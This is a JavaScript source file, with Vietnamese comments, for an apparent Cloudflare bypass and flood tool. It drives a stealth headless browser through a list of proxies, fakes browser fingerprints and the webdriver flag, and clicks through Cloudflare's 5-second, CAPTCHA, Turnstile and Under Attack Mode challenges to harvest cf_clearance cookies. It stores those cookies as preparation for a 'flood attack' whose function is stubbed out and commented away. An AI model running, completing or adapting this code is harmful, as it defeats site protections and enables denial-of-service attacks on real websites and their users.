[file name]: enhanced_cf_solver.js
[file content begin]
const errorHandler = error => {
  console.error('Unhandled error:', error);
};

process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

const fs = require("fs");
const url = require('url');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const crypto = require('crypto');
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const UserAgent = require('user-agents');

// Tăng giới hạn listeners
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 50;

// Sử dụng stealth plugin
const stealthPlugin = StealthPlugin();
puppeteer.use(stealthPlugin);

// Plugin để randomize user preferences
puppeteer.use(require('puppeteer-extra-plugin-user-preferences')({
  userPrefs: {
    webkit: {
      webprefs: {
        default_font_size: Math.floor(Math.random() * 6) + 14,
        text_autosizing_enabled: false
      }
    }
  }
}));

// Plugin để ẩn WebDriver
puppeteer.use(require('puppeteer-extra-plugin-anonymize-ua')());

// Kiểm tra tham số
if (process.argv.length < 8) {
  console.clear();
  console.log("Usage: node enhanced_cf_solver.js <targetURL> <proxyFile> <threads> <duration> <rps> <floodDuration>");
  process.exit(1);
}

const targetURL = process.argv[2];
const proxyFile = process.argv[3];
const threads = +process.argv[4];
const duration = +process.argv[5];
const rps = +process.argv[6];
const floodDuration = +process.argv[7];

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const readLines = path => fs.readFileSync(path).toString()
  .split(/\r?\n/)
  .filter(line => line.trim() !== '' && !line.startsWith('#'));

let proxies = [];
try {
  proxies = readLines(proxyFile);
} catch (e) {
  console.error(`Error reading proxy file: ${e.message}`);
  process.exit(1);
}

let successfulProxies = [];
let statusCounts = {};
let totalSolved = 0;
let totalFailed = 0;

// ================== ENHANCED USER AGENTS ==================
const USER_AGENTS = [
  // Chrome Windows
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6521.0 Safari/537.36',
  
  // Chrome Mac
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36',
  
  // Chrome Linux
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36',
  
  // Firefox
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0',
  
  // Edge
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36 Edg/126.0.2578.0',
  
  // Safari
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
];

// ================== ENHANCED SCREEN RESOLUTIONS ==================
const SCREEN_RESOLUTIONS = [
  { width: 1920, height: 1080 },
  { width: 1366, height: 768 },
  { width: 1536, height: 864 },
  { width: 1440, height: 900 },
  { width: 1280, height: 720 },
  { width: 1600, height: 900 },
  { width: 2560, height: 1440 },
];

// ================== CLOUDFLARE CHALLENGE DETECTION ==================
async function detectChallengeType(page) {
  try {
    await page.waitForSelector('body', { timeout: 10000 });
    
    const content = await page.content();
    const title = await page.title();
    const url = page.url();
    
    console.log(`[DEBUG] Page Title: ${title}`);
    console.log(`[DEBUG] Page URL: ${url}`);
    
    // Kiểm tra các loại challenge
    if (title.includes('Just a moment') || title.includes('Checking your browser')) {
      return '5_SECOND_CHALLENGE';
    }
    
    if (title.includes('Attention Required!') || title.includes('Cloudflare')) {
      return 'CAPTCHA_CHALLENGE';
    }
    
    if (content.includes('cf-chl-widget') || content.includes('turnstile')) {
      return 'TURNSTILE_CHALLENGE';
    }
    
    if (content.includes('cf_captcha_kind') || content.includes('cf_chl_prog')) {
      return 'INTERACTIVE_CHALLENGE';
    }
    
    if (content.includes('ray id') || content.includes('cloudflare')) {
      return 'UAM_CHALLENGE';
    }
    
    // Kiểm tra bằng selector
    const challengeSelectors = [
      '#challenge-form',
      '.challenge-form',
      '#challenge-running',
      '.cf-browser-verification',
      'iframe[src*="cloudflare"]',
      'iframe[src*="challenges"]',
      '#cf-challenge-running',
      '#challenge-stage',
      '#trk_jschal_js',
      '#trk_captcha_js'
    ];
    
    for (const selector of challengeSelectors) {
      const element = await page.$(selector);
      if (element) {
        return 'GENERIC_CHALLENGE';
      }
    }
    
    return 'NO_CHALLENGE';
  } catch (error) {
    console.error(`[ERROR] Error detecting challenge: ${error.message}`);
    return 'UNKNOWN';
  }
}

// ================== ENHANCED HUMAN-LIKE INTERACTIONS ==================
async function performHumanLikeInteractions(page) {
  try {
    // Di chuyển chuột tự nhiên
    const viewport = page.viewport();
    const centerX = viewport.width / 2;
    const centerY = viewport.height / 2;
    
    // Di chuyển chuột theo đường cong
    await page.mouse.move(centerX - 100, centerY - 100, { steps: 10 });
    await sleep(Math.random() * 500 + 200);
    await page.mouse.move(centerX + 50, centerY + 50, { steps: 15 });
    await sleep(Math.random() * 300 + 100);
    await page.mouse.move(centerX, centerY, { steps: 8 });
    
    // Click nhẹ
    await page.mouse.down();
    await sleep(50);
    await page.mouse.up();
    
    // Cuộn trang tự nhiên
    await page.evaluate(() => {
      window.scrollBy({
        top: Math.random() * 300 + 100,
        behavior: 'smooth'
      });
    });
    
    await sleep(Math.random() * 1000 + 500);
    
    // Thêm một số phím bấm ngẫu nhiên
    await page.keyboard.press('Tab');
    await sleep(200);
    await page.keyboard.press('Tab');
    
    return true;
  } catch (error) {
    console.log(`[WARN] Human interactions failed: ${error.message}`);
    return false;
  }
}

// ================== SOLVE 5-SECOND CHALLENGE ==================
async function solveFiveSecondChallenge(page, proxy) {
  console.log(`[${maskString(proxy)}] Solving 5-second challenge...`);
  
  let attempts = 0;
  const maxAttempts = 3;
  
  while (attempts < maxAttempts) {
    try {
      // Chờ challenge hoàn tất
      await sleep(6 + Math.random() * 2); // Chờ 6-8 giây
      
      // Kiểm tra nếu challenge đã qua
      const title = await page.title();
      const currentUrl = await page.url();
      
      if (!title.includes('Just a moment') && !currentUrl.includes('challenge')) {
        console.log(`[${maskString(proxy)}] 5-second challenge solved!`);
        return true;
      }
      
      // Thử reload nếu chưa qua
      attempts++;
      if (attempts < maxAttempts) {
        console.log(`[${maskString(proxy)}] Retrying 5-second challenge (attempt ${attempts}/${maxAttempts})`);
        await page.reload({ waitUntil: 'networkidle0', timeout: 30000 });
        await sleep(5);
      }
    } catch (error) {
      console.error(`[${maskString(proxy)}] Error solving 5-second challenge: ${error.message}`);
      attempts++;
      await sleep(2000);
    }
  }
  
  return false;
}

// ================== SOLVE CAPTCHA CHECKBOX ==================
async function solveCaptchaCheckbox(page, proxy) {
  console.log(`[${maskString(proxy)}] Attempting to solve CAPTCHA checkbox...`);
  
  try {
    // Tìm iframe CAPTCHA
    const captchaIframe = await page.$('iframe[src*="challenges.cloudflare.com/cdn-cgi/challenge-platform"]');
    
    if (captchaIframe) {
      console.log(`[${maskString(proxy)}] Found CAPTCHA iframe`);
      
      // Switch to iframe
      const frame = await captchaIframe.contentFrame();
      
      if (frame) {
        // Tìm checkbox
        const checkbox = await frame.$('input[type="checkbox"]');
        
        if (checkbox) {
          console.log(`[${maskString(proxy)}] Found CAPTCHA checkbox`);
          
          // Thực hiện hành động giống người trước khi click
          await performHumanLikeInteractions(page);
          
          // Click checkbox
          await checkbox.click({ delay: Math.random() * 100 + 50 });
          console.log(`[${maskString(proxy)}] Clicked CAPTCHA checkbox`);
          
          // Chờ xác minh
          await sleep(3000 + Math.random() * 2000);
          
          // Kiểm tra kết quả
          const isVerified = await page.evaluate(() => {
            return !document.title.includes('Attention Required') && 
                   !document.body.innerHTML.includes('cf_captcha_kind');
          });
          
          if (isVerified) {
            console.log(`[${maskString(proxy)}] CAPTCHA checkbox solved successfully!`);
            return true;
          }
        }
      }
    }
    
    // Phương pháp dự phòng: Tìm và click trực tiếp
    const checkButton = await page.$('.hcaptcha-box, .cf-checkbox, [data-sitekey], #checkbox');
    if (checkButton) {
      console.log(`[${maskString(proxy)}] Found alternative CAPTCHA element`);
      await checkButton.click({ delay: Math.random() * 150 + 50 });
      await sleep(4000);
      return true;
    }
    
    console.log(`[${maskString(proxy)}] No CAPTCHA checkbox found`);
    return false;
    
  } catch (error) {
    console.error(`[${maskString(proxy)}] Error solving CAPTCHA: ${error.message}`);
    return false;
  }
}

// ================== SOLVE TURNSTILE CHALLENGE ==================
async function solveTurnstileChallenge(page, proxy) {
  console.log(`[${maskString(proxy)}] Attempting to solve Turnstile challenge...`);
  
  try {
    // Tìm Turnstile widget
    const turnstileWidget = await page.$('[data-sitekey], .cf-turnstile, iframe[src*="challenges.cloudflare.com/turnstile"]');
    
    if (turnstileWidget) {
      console.log(`[${maskString(proxy)}] Found Turnstile widget`);
      
      // Thử click trực tiếp
      await turnstileWidget.click({ delay: Math.random() * 200 + 100 });
      await sleep(5000);
      
      // Kiểm tra xem đã qua challenge chưa
      const currentUrl = await page.url();
      if (!currentUrl.includes('challenges.cloudflare.com')) {
        console.log(`[${maskString(proxy)}] Turnstile challenge may be solved`);
        return true;
      }
    }
    
    return false;
  } catch (error) {
    console.error(`[${maskString(proxy)}] Error with Turnstile: ${error.message}`);
    return false;
  }
}

// ================== SOLVE UAM (UNDER ATTACK MODE) ==================
async function solveUAMChallenge(page, proxy) {
  console.log(`[${maskString(proxy)}] Solving UAM challenge...`);
  
  try {
    // Tìm nút verify
    const verifyButton = await page.$('#verifyButton, .verify-button, [value="Verify"]');
    
    if (verifyButton) {
      console.log(`[${maskString(proxy)}] Found verify button`);
      
      // Thực hiện hành động giống người
      await performHumanLikeInteractions(page);
      
      // Click verify button
      await verifyButton.click({ delay: Math.random() * 150 + 50 });
      console.log(`[${maskString(proxy)}] Clicked verify button`);
      
      // Chờ xử lý
      await sleep(5000 + Math.random() * 2000);
      
      // Kiểm tra kết quả
      const isVerified = await page.evaluate(() => {
        return !document.title.includes('Just a moment') && 
               !document.body.innerHTML.includes('cf-browser-verification');
      });
      
      if (isVerified) {
        console.log(`[${maskString(proxy)}] UAM challenge solved!`);
        return true;
      }
    }
    
    // Thử phương pháp khác: tìm form và submit
    const challengeForm = await page.$('#challenge-form, .challenge-form');
    if (challengeForm) {
      console.log(`[${maskString(proxy)}] Found challenge form, attempting to submit`);
      await challengeForm.evaluate(form => form.submit());
      await sleep(6000);
      return true;
    }
    
    return false;
  } catch (error) {
    console.error(`[${maskString(proxy)}] Error solving UAM: ${error.message}`);
    return false;
  }
}

// ================== MAIN CHALLENGE SOLVER ==================
async function solveCloudflareChallenge(page, proxy) {
  console.log(`[${maskString(proxy)}] Detecting challenge type...`);
  
  const challengeType = await detectChallengeType(page);
  console.log(`[${maskString(proxy)}] Challenge type: ${challengeType}`);
  
  switch (challengeType) {
    case '5_SECOND_CHALLENGE':
      return await solveFiveSecondChallenge(page, proxy);
      
    case 'CAPTCHA_CHALLENGE':
    case 'INTERACTIVE_CHALLENGE':
      return await solveCaptchaCheckbox(page, proxy);
      
    case 'TURNSTILE_CHALLENGE':
      return await solveTurnstileChallenge(page, proxy);
      
    case 'UAM_CHALLENGE':
    case 'GENERIC_CHALLENGE':
      return await solveUAMChallenge(page, proxy);
      
    case 'NO_CHALLENGE':
      console.log(`[${maskString(proxy)}] No challenge detected, proceeding...`);
      return true;
      
    default:
      console.log(`[${maskString(proxy)}] Unknown challenge, trying generic approach...`);
      
      // Thử tất cả các phương pháp
      const methods = [
        () => solveFiveSecondChallenge(page, proxy),
        () => solveUAMChallenge(page, proxy),
        () => solveCaptchaCheckbox(page, proxy)
      ];
      
      for (const method of methods) {
        try {
          const result = await method();
          if (result) return true;
        } catch (e) {
          continue;
        }
      }
      
      return false;
  }
}

// ================== UTILITY FUNCTIONS ==================
function maskString(proxy) {
  if (!proxy || typeof proxy !== 'string') return '***';
  
  try {
    const parts = proxy.split(':');
    if (parts.length >= 2) {
      const ipParts = parts[0].split('.');
      if (ipParts.length === 4) {
        ipParts[2] = '***';
        ipParts[3] = '***';
        return `${ipParts.join('.')}:${'*'.repeat(parts[1].length)}`;
      }
    }
    return proxy.replace(/.(?=.{3})/g, '*');
  } catch (e) {
    return '***';
  }
}

function getRandomUserAgent() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function getRandomScreenResolution() {
  return SCREEN_RESOLUTIONS[Math.floor(Math.random() * SCREEN_RESOLUTIONS.length)];
}

function generateRandomHeaders() {
  const acceptLanguages = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.9',
    'fr-FR,fr;q=0.9',
    'de-DE,de;q=0.8',
    'es-ES,es;q=0.7',
    'ja-JP,ja;q=0.6',
  ];
  
  const secCHUA = [
    '"Chromium";v="126", "Not)A;Brand";v="24", "Google Chrome";v="126"',
    '"Not.A/Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
  ];
  
  return {
    'accept-language': acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
    'sec-ch-ua': secCHUA[Math.floor(Math.random() * secCHUA.length)],
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
  };
}

// ================== ENHANCED PUPPETEER CONFIG ==================
function getPuppeteerArgs(proxy, userAgent, resolution) {
  const args = [
    `--proxy-server=${proxy}`,
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-gpu',
    '--disable-accelerated-2d-canvas',
    '--disable-web-security',
    '--disable-features=IsolateOrigins,site-per-process',
    '--disable-blink-features=AutomationControlled',
    '--disable-infobars',
    '--disable-notifications',
    '--disable-popup-blocking',
    '--disable-background-timer-throttling',
    '--disable-backgrounding-occluded-windows',
    '--disable-renderer-backgrounding',
    '--disable-breakpad',
    '--disable-component-extensions-with-background-pages',
    '--disable-default-apps',
    '--disable-extensions',
    '--disable-component-update',
    '--allow-running-insecure-content',
    '--autoplay-policy=no-user-gesture-required',
    '--disable-domain-reliability',
    '--disable-ipc-flooding-protection',
    '--disable-sync',
    '--enable-features=NetworkService,NetworkServiceInProcess',
    '--force-color-profile=srgb',
    '--hide-scrollbars',
    '--metrics-recording-only',
    '--mute-audio',
    '--no-default-browser-check',
    '--no-first-run',
    '--use-gl=swiftshader',
    '--no-zygote',
    '--single-process',
    '--disable-software-rasterizer',
    '--disable-background-networking',
    '--disable-client-side-phishing-detection',
    '--disable-default-apps',
    '--disable-hang-monitor',
    '--disable-prompt-on-repost',
    '--disable-sync',
    '--disable-translate',
    '--disable-windows10-custom-titlebar',
    '--password-store=basic',
    '--use-mock-keychain',
    '--window-size=' + resolution.width + ',' + resolution.height,
    '--user-agent=' + userAgent,
  ];
  
  return args;
}

// ================== MAIN CLOUDFLARE SOLVER ==================
async function getCfClearance(proxy) {
  const startTime = Date.now();
  const userAgent = getRandomUserAgent();
  const resolution = getRandomScreenResolution();
  const proxyMasked = maskString(proxy);
  
  console.log(`\n[${proxyMasked}] Starting Cloudflare solver...`);
  console.log(`[${proxyMasked}] User Agent: ${userAgent.substring(0, 50)}...`);
  console.log(`[${proxyMasked}] Resolution: ${resolution.width}x${resolution.height}`);
  
  let browser = null;
  let success = false;
  let cfCookie = null;
  
  try {
    // Launch browser với cấu hình nâng cao
    browser = await puppeteer.launch({
      headless: 'new', // Sử dụng headless mới
      ignoreHTTPSErrors: true,
      args: getPuppeteerArgs(proxy, userAgent, resolution),
      defaultViewport: resolution,
      ignoreDefaultArgs: ['--enable-automation', '--disable-extensions'],
    });
    
    const [page] = await browser.pages();
    
    // Thêm extra headers
    await page.setExtraHTTPHeaders(generateRandomHeaders());
    
    // Bypass các detection
    await page.evaluateOnNewDocument(() => {
      Object.defineProperty(navigator, 'webdriver', { get: () => false });
      Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
      Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
      
      // Override permissions
      const originalQuery = window.navigator.permissions.query;
      window.navigator.permissions.query = (parameters) => (
        parameters.name === 'notifications' ?
          Promise.resolve({ state: Notification.permission }) :
          originalQuery(parameters)
      );
    });
    
    // Điều hướng đến trang
    console.log(`[${proxyMasked}] Navigating to target...`);
    await page.goto(targetURL, {
      waitUntil: 'networkidle2',
      timeout: 30000,
    });
    
    // Chờ load ban đầu
    await sleep(3000);
    
    // Phát hiện và giải challenge
    console.log(`[${proxyMasked}] Checking for challenges...`);
    const challengeSolved = await solveCloudflareChallenge(page, proxy);
    
    if (challengeSolved) {
      console.log(`[${proxyMasked}] Challenge solved successfully!`);
      
      // Lấy cookies
      const cookies = await page.cookies();
      cfCookie = cookies.find(c => c.name === 'cf_clearance');
      
      if (cfCookie) {
        const cookieStr = `${cfCookie.name}=${cfCookie.value}`;
        const executionTime = ((Date.now() - startTime) / 1000).toFixed(2);
        
        console.log(`\n✅ [SUCCESS] ${proxyMasked}`);
        console.log(`   Cookie: ${cookieStr}`);
        console.log(`   Time: ${executionTime}s`);
        console.log(`   User Agent: ${userAgent.substring(0, 30)}...`);
        
        // Lưu vào danh sách thành công
        successfulProxies.push({
          proxy: proxy,
          userAgent: userAgent,
          cookie: cookieStr,
          resolution: resolution
        });
        
        // Lưu vào file
        fs.appendFileSync('successful_cookies.txt', 
          `${proxy}|${userAgent}|${cookieStr}|${resolution.width}x${resolution.height}\n`);
        
        success = true;
        totalSolved++;
      } else {
        console.log(`❌ [${proxyMasked}] No cf_clearance cookie found after challenge`);
        totalFailed++;
      }
    } else {
      console.log(`❌ [${proxyMasked}] Failed to solve challenge`);
      totalFailed++;
    }
    
  } catch (error) {
    console.error(`❌ [ERROR] ${proxyMasked}: ${error.message}`);
    totalFailed++;
    
    // Ghi lỗi vào log file
    fs.appendFileSync('error_log.txt', 
      `[${new Date().toISOString()}] ${proxyMasked}: ${error.message}\n`);
    
  } finally {
    // Đóng browser
    if (browser) {
      try {
        await browser.close();
      } catch (e) {
        console.log(`[${proxyMasked}] Warning: Error closing browser: ${e.message}`);
      }
    }
    
    // Log tổng kết
    const successRate = totalSolved + totalFailed > 0 ? 
      ((totalSolved / (totalSolved + totalFailed)) * 100).toFixed(2) : '0.00';
    
    console.log(`\n📊 [STATUS] Solved: ${totalSolved} | Failed: ${totalFailed} | Success Rate: ${successRate}%`);
    
    return success ? cfCookie : null;
  }
}

// ================== FLOOD FUNCTION (giữ nguyên) ==================
function flood(proxy, userAgent, cookie) {
  // Giữ nguyên hàm flood từ file gốc
  // ... (code flood giữ nguyên)
}

// ================== MAIN EXECUTION ==================
async function main() {
  console.log(`
=====================================================
       ENHANCED CLOUDFLARE SOLVER v2.0
       No API - Auto Challenge Solver
=====================================================
Target: ${targetURL}
Proxies: ${proxies.length}
Threads: ${threads}
Solve Time: ${duration}s
=====================================================
  `);
  
  // Tạo timeout tổng
  const timeoutId = setTimeout(() => {
    console.log(`\n⏰ Timeout reached after ${duration} seconds`);
    console.log(`✅ Successful: ${successfulProxies.length} proxies`);
    
    if (successfulProxies.length > 0) {
      console.log(`🚀 Starting flood with ${successfulProxies.length} working proxies...`);
      // Bắt đầu flood
      // startFlood();
    } else {
      console.log('❌ No proxies solved Cloudflare successfully');
      process.exit(1);
    }
  }, duration * 1000);
  
  // Xử lý từng proxy theo luồng
  const processProxy = async (proxy, index) => {
    console.log(`\n[${index + 1}/${proxies.length}] Processing proxy...`);
    await getCfClearance(proxy);
  };
  
  // Chia thành các batch xử lý
  for (let i = 0; i < proxies.length; i += threads) {
    const batch = proxies.slice(i, i + threads);
    console.log(`\n📦 Processing batch ${Math.floor(i/threads) + 1} (${batch.length} proxies)`);
    
    await Promise.allSettled(
      batch.map((proxy, idx) => processProxy(proxy, i + idx))
    );
    
    // Nghỉ giữa các batch để tránh detection
    if (i + threads < proxies.length) {
      const waitTime = 5 + Math.random() * 10;
      console.log(`\n⏳ Waiting ${waitTime.toFixed(1)}s before next batch...`);
      await sleep(waitTime * 1000);
    }
  }
  
  // Kết thúc
  clearTimeout(timeoutId);
  console.log('\n' + '='.repeat(50));
  console.log('🎯 PROCESS COMPLETED');
  console.log(`✅ Total Solved: ${totalSolved}`);
  console.log(`❌ Total Failed: ${totalFailed}`);
  console.log(`📈 Success Rate: ${((totalSolved / proxies.length) * 100).toFixed(2)}%`);
  console.log('='.repeat(50));
  
  if (successfulProxies.length > 0) {
    console.log('\n💾 Cookies saved to: successful_cookies.txt');
    console.log('🚀 Ready to start flood attack...');
    // startFlood();
  }
}

// Chạy chương trình
main().catch(console.error);
[file content end]